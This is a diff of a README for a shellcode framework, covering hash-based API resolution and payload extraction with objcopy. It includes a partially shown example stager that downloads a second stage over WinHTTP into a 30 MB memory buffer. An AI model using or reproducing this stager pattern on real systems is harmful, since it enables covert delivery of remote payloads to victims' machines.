@@ -1,33 +1,46 @@
-## A simple and easy-to-use shellcode framework
-### Structure description 
-The api folder provides the get_function_address function and get_function_address_by_hash function to find the target function address. Please refer to the function signature for related parameters.
-At the same time, this folder defines the structures and macro functions required in the framework (extracted from the mingw related header files). Theoretically, the relevant structures and macro functions defined in this folder have been adapted to the x64 platform
-and x86 platforms, the x64 platform has been experimentally verified, and the x86 platform has yet to be verified. 
+## A Simple and Easy-to-Use Shellcode Framework
 
-The frame folder provides the cmake function, the frame macro FRAME_FUNCTION, the preset function signature header file function_signature.h and the commonly used macro constant header file frame_constant_marco.h;
-The cmake function is used to quickly compile exe, and objcopy is used to extract the assembly code of the .payload section in exe as the exported shellcode; the framework macro FRAME_FUNCTION is used to modify the function.
-Export the function according to the C language convention and write the assembly code into the .payload section; 
+### Structure Overview
 
-The frame_api folder provides simple implementations of some basic functions. Currently, there are only frame_memcpy and frame_memset functions. These two functions have the same functions as the ordinary memcpy and memset functions. 
+The `api` directory provides the `get_function_address` and `get_function_address_by_hash` functions for resolving target function addresses. Refer to the function signatures for the required parameters.
 
-The hash folder provides hash calculation functions for dynamic addressing of the get_function_address and get_function_address_by_hash functions.
+This directory also defines the structures and macro helpers required by the framework, extracted from MinGW-related headers. In theory, these structures and macros support both x64 and x86. The x64 path has been verified in practice, while x86 still needs validation.
 
-### Usage examples 
-Clone this project locally, create a cpp file in the project root directory, define a function that implements shellcode logic in the file, and modify it with the FRAME_FUNCTION macro;
-After implementing the relevant logic, call the prepared cmake function in CMakeLists.txt. The parameter list of the cmake function is (product name, entry function, cpp file where the entry function is located),
-Just build it at the end. If you use the Clion compiler, after building, both exe files and bin files will be generated in the cmake-build-* directory. The bin file is the shellcode we need. 
+The `frame` directory provides:
 
-Create the shellcode.cpp file, define the shellcode_entry function to implement shellcode logic, and finally set the cmake function parameters in CMakeLists.txt: 
-(shellcode shellcode_entry shellcode.cpp)
+- the CMake helper function used to build shellcode targets
+- the framework macro `FRAME_FUNCTION`
+- the shellcode entry macro `SHELLCODE_ENTRY`
+- the predefined function signature header `function_signature.h`
+- the linker script used to control memory layout
+- the common macro constants header `frame_constant_macro.h`
+
+The CMake helper quickly builds an `.exe` target and then uses `objcopy` to extract the `.payload` section into exported shellcode. The `FRAME_FUNCTION` macro is used to export functions with a C-compatible calling convention and place the generated code into the `.payload` section.
+
+The `frame_api` directory provides simple implementations of basic functions. At the moment it contains `frame_memcpy` and `frame_memset`, which are functionally equivalent to standard `memcpy` and `memset`.
+
+The `hash` directory provides hash calculation helpers used by `get_function_address` and `get_function_address_by_hash` for dynamic symbol resolution.
+
+### Usage Example
+
+Clone the project locally, then create a `.cpp` file in the project root and define a function that implements your shellcode logic. Mark the entry function with the `SHELLCODE_ENTRY` macro.
+
+After implementing the logic, call the provided CMake helper in `CMakeLists.txt`. Its parameter list is:
+
+`(target_name entry_source_cpp_file)`
+
+Then build the project. CLion is recommended because it usually ships with `objdump` and `objcopy`. After building, the `cmake-build-*` directory will contain both an `.exe` file and a `.bin` file. The `.bin` file is the extracted shellcode, while the `.exe` file is useful for quick validation without additional loader setup.
+
+In the current project configuration, the target is declared as:
+
+`(stager_shellcode shellcode.cpp)`
+
+Example:
 
 ```cpp
-#include "frame/function_signature.h"
-#include "frame/frame.h"
-#include "frame/frame_constant_macro.h"
-#include "api/api.h"
-#include "frame_api/frame_api.h"
+#include "frame/frame_macro.h"
 
-FRAME_FUNCTION void shellcode_entry(void) {
+SHELLCODE_ENTRY void shellcode_entry(void) {
     constexpr char kernel32_dll[] = "kernel32.dll";
     constexpr char load_lib_a[] = "LoadLibraryA";
     constexpr char win_http_dll[] = "winhttp.dll";
@@ -85,7 +98,7 @@ FRAME_FUNCTION void shellcode_entry(void) {
     void* connect = nullptr;
     void* request = nullptr;
 
-     session = _WinHttpOpen(
+    session = _WinHttpOpen(
         user_agent,
         FRAME_WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         nullptr,
@@ -134,7 +147,7 @@ FRAME_FUNCTION void shellcode_entry(void) {
         goto cleanup;
     }
 
-     stager2 = static_cast<uint8_t*>(_VirtualAlloc(
+    stager2 = static_cast<uint8_t*>(_VirtualAlloc(
         nullptr,
         1024 * 1024 * 30,
         FRAME_MEM_COMMIT | FRAME_MEM_RESERVE,
@@ -163,7 +176,6 @@ FRAME_FUNCTION void shellcode_entry(void) {
         }
 
         stager2_size += read_bytes;
-
     }
 
 cleanup:
@@ -186,7 +198,10 @@ cleanup:
 }
 ```
 
-### Finally 
-Most of the basic ideas for implementing the shellcode framework are the same. Dynamic addressing is used to find the corresponding function address, and finally the function is called through a function pointer to avoid the introduction of import tables and other contents that lead to shellcode dependencies.
-Process context or related PE initialization. The shellcode_frame project's idea of obtaining the currently loaded DLL is based on the https://github.com/jackullrich/ShellcodeStdio project. Thanks to the author of this project.
-ideas provided.
+### Notes
+
+Most shellcode frameworks follow the same general approach: resolve function addresses dynamically, then invoke them through function pointers. This avoids introducing an import table or other PE-level dependencies on process context or loader initialization.
+
+The logic used in this project to locate already loaded DLLs was inspired by the `ShellcodeStdio` project:
+
+https://github.com/jackullrich/ShellcodeStdio
